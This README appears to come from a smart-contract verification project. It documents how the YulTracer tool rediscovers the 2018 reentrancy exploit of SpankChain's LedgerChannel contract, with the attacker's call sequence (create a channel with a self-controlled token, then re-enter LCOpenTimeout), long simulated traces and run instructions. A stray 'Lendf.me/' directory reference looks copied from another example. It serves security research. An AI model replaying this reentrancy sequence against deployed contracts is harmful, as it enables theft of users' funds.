# SpankChain Exploit — YulTracer Analysis

This directory contains an analysis of the reentrancy attack on `SpankChain_Payment.sol` as provided in the gigahorse-benchmarks, which in turn comes as provided by Etherscan.

**NOTE**: Tested for `solc` version `0.8.30+commit.73712a01.Linux.g++` and OCaml `4.10.1`,  on Ubuntu `24.04.2 LTS`.

## Background

This is the final reentrancy example provided in the gigahorse-benchmarks. While every other example in the benchmark has been a toy example, this one is a real set of contracts that was exploited in 2018. An attacker stole 165 Ether (valued at $40,000) from SpankChain. Because this is a real contract, this directory has its own README.

## The Exploit

The expoit is a simple reentrancy attack. From the point of view of the oppponent, the sequence is as follows:  

1. Call `createChannel(bytes32,address,uint256,address,uint256[2])` with a WEI value of 1. The arguments are:
   - any fresh channel ID (in this case, all are fresh)
   - address for the payee (in this case, its own address)
   - confirmation time (0 enables instant timeout, which requires any timestamp above the current one)
   - address for a malicious token (in this case, its own address)
   - a pair which states how much ETH and how many tokens to deposit (in this case `[1,1]`)
   
   YulTracer will generate these arguments by trying out values from the domain of values that it knows.
2. Wait any amount of time (in this case 1 day)
3. Call `LCOpenTimeout(bytes32)` on the channel ID (`_lcID`) which you want to close via timeout, which allow the channel creator to reclaim their funds
4. Reenter`LCOpenTimeout(bytes32)` before the channel state is updated

### Minimal ABI

With YulTracer, a minimal ABI is provided in `abi/LedgerChannel_pruned.json`. Running the exploration with this ABI produces the minimal trace for the exploit:
```
create(object:<ECTools_645> , address:<0x9fba6be>) --> 
pp-ret([ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ed,84,9a,9b]) --> 
deploy(object:<LedgerChannel_3495_deployed> , address:<0x102030405060708090a0b0c0d0e0f1011121314>) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<LedgerChannel_3495_deployed:0x102030405060708090a0b0c0d0e0f1011121314>, sig:<createChannel(bytes32,address,uint256,address,uint256[2]):0xaeba142c>, args:<[ae,ba,14,2c,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4f,50,5f,41,44,44,52,45,53,53,5f,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4f,50,5f,41,44,44,52,45,53,53,5f,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]>, value:<1>) --> 
po-call(0x4f505f414444524553535f30) --> 
o-ret([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]) --> 
po-ret([]) --> 
o-wait --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<LedgerChannel_3495_deployed:0x102030405060708090a0b0c0d0e0f1011121314>, sig:<LCOpenTimeout(bytes32):0x002e1d7e>, args:<[0,2e,1d,7e,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]>, value:<0>) --> 
po-call(0x4f505f414444524553535f30) --> 
o-ret([]) --> 
po-call(0x4f505f414444524553535f30) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<LedgerChannel_3495_deployed:0x102030405060708090a0b0c0d0e0f1011121314>, sig:<LCOpenTimeout(bytes32):0x002e1d7e>, args:<[0,2e,1d,7e,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]>, value:<0>)
ERROR! [game semantics]: [EVM ASSERTION ERROR]: [move_ether]: sender 0x102030405060708090a0b0c0d0e0f1011121314 has insufficient balance (0) to transfer 1

real	0m0.178s
user	0m0.135s
sys	0m0.041s
```

### Full ABI

Also provided in this directory is `abi/LedgerChannel_pruned_full_abi.json`, which is the copmlete ABI for all contracts deployed, excluding 4 functions which require unsupported array types at the moment (`uint[N]` where `N > 2`). This ABI produces the following trace:
```
create(object:<ECTools_645> , address:<0x9fba6be>) --> 
pp-ret([ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ff,ed,84,9a,9b]) --> 
deploy(object:<LedgerChannel_3495_deployed> , address:<0x102030405060708090a0b0c0d0e0f1011121314>) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<ECTools_645_deployed:0x9fba6be>, sig:<uintToString(uint256):0xe9395679>, args:<[e9,39,56,79,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]>, value:<0>) --> 
po-ret([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<ECTools_645_deployed:0x9fba6be>, sig:<uintToString(uint256):0xe9395679>, args:<[e9,39,56,79,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]>, value:<0>) --> 
po-ret([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<ECTools_645_deployed:0x9fba6be>, sig:<uintToBytes32(uint256):0x886d3db9>, args:<[88,6d,3d,b9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]>, value:<0>) --> 
po-ret([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<ECTools_645_deployed:0x9fba6be>, sig:<uintToBytes32(uint256):0x886d3db9>, args:<[88,6d,3d,b9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]>, value:<0>) --> 
po-ret([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<ECTools_645_deployed:0x9fba6be>, sig:<toEthereumSignedMessage(string):0xdae21454>, args:<[da,e2,14,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,b,6c,6f,6e,65,6c,79,2c,20,73,6f,20,6c,6f,6e,65,6c,79,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]>, value:<0>) --> 
po-ret([fd,23,83,40,fa,67,f4,60,54,44,c6,73,4e,f0,76,67,3d,a2,8c,a9,a3,54,89,c,34,c6,90,15,b,32,8d,d4]) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<ECTools_645_deployed:0x9fba6be>, sig:<toEthereumSignedMessage(string):0xdae21454>, args:<[da,e2,14,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,b,6c,6f,6e,65,6c,79,2c,20,73,6f,20,6c,6f,6e,65,6c,79,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]>, value:<0>) --> 
po-ret([fd,23,83,40,fa,67,f4,60,54,44,c6,73,4e,f0,76,67,3d,a2,8c,a9,a3,54,89,c,34,c6,90,15,b,32,8d,d4]) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<ECTools_645_deployed:0x9fba6be>, sig:<substring(string,uint256,uint256):0x1dcd9b55>, args:<[1d,cd,9b,55,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,60,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,b,6c,6f,6e,65,6c,79,2c,20,73,6f,20,6c,6f,6e,65,6c,79,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]>, value:<0>) --> 
po-ret([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<ECTools_645_deployed:0x9fba6be>, sig:<substring(string,uint256,uint256):0x1dcd9b55>, args:<[1d,cd,9b,55,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,60,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,b,6c,6f,6e,65,6c,79,2c,20,73,6f,20,6c,6f,6e,65,6c,79,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]>, value:<0>) --> 
po-ret([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<ECTools_645_deployed:0x9fba6be>, sig:<recoverSigner(bytes32,string):0xdca95419>, args:<[dc,a9,54,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,b,6c,6f,6e,65,6c,79,2c,20,73,6f,20,6c,6f,6e,65,6c,79,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]>, value:<0>) --> 
po-ret([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<ECTools_645_deployed:0x9fba6be>, sig:<recoverSigner(bytes32,string):0xdca95419>, args:<[dc,a9,54,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,b,6c,6f,6e,65,6c,79,2c,20,73,6f,20,6c,6f,6e,65,6c,79,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]>, value:<0>) --> 
po-ret([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<ECTools_645_deployed:0x9fba6be>, sig:<isSignedBy(bytes32,string,address):0x1052506f>, args:<[10,52,50,6f,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,60,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4f,50,5f,41,44,44,52,45,53,53,5f,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,b,6c,6f,6e,65,6c,79,2c,20,73,6f,20,6c,6f,6e,65,6c,79,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]>, value:<0>) --> 
po-ret([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<ECTools_645_deployed:0x9fba6be>, sig:<isSignedBy(bytes32,string,address):0x1052506f>, args:<[10,52,50,6f,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,60,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4f,50,5f,41,44,44,52,45,53,53,5f,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,b,6c,6f,6e,65,6c,79,2c,20,73,6f,20,6c,6f,6e,65,6c,79,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]>, value:<0>) --> 
po-ret([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<LedgerChannel_3495_deployed:0x102030405060708090a0b0c0d0e0f1011121314>, sig:<createChannel(bytes32,address,uint256,address,uint256[2]):0xaeba142c>, args:<[ae,ba,14,2c,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4f,50,5f,41,44,44,52,45,53,53,5f,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4f,50,5f,41,44,44,52,45,53,53,5f,30,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]>, value:<1>) --> 
po-call(0x4f505f414444524553535f30) --> 
o-ret([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]) --> 
po-ret([]) --> 
o-wait --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<LedgerChannel_3495_deployed:0x102030405060708090a0b0c0d0e0f1011121314>, sig:<LCOpenTimeout(bytes32):0x002e1d7e>, args:<[0,2e,1d,7e,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]>, value:<0>) --> 
po-call(0x4f505f414444524553535f30) --> 
o-ret([]) --> 
po-call(0x4f505f414444524553535f30) --> 
o-call(caller:<0x4f505f414444524553535f30>, target:<LedgerChannel_3495_deployed:0x102030405060708090a0b0c0d0e0f1011121314>, sig:<LCOpenTimeout(bytes32):0x002e1d7e>, args:<[0,2e,1d,7e,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]>, value:<0>)
ERROR! [game semantics]: [EVM ASSERTION ERROR]: [move_ether]: sender 0x102030405060708090a0b0c0d0e0f1011121314 has insufficient balance (0) to transfer 1

real	24m29.897s
user	24m28.130s
sys	0m0.695s
```

## Running the YulTracer

1. Ensure you have Python and the Crypto library installed:

   ```bash
   pip install pycryptodome
   ```
   You may need to set up a virtual environment in Linux using `venv`.

2. From the `Lendf.me/` directory, run:

   ```bash
   make run
   ```
   To run YulTracer and explore the SpankChain `LedgerChannel` contract (and its dependencies). The default ABI used is the pruned minimal version.

3. To run the exploration with the full ABI, the file
   ```
   abi/LedgerChannel_pruned_full_abi.json
   ``` 
   has to be renamed to 
   ```
   abi/LedgerChannel_pruned.json
   ```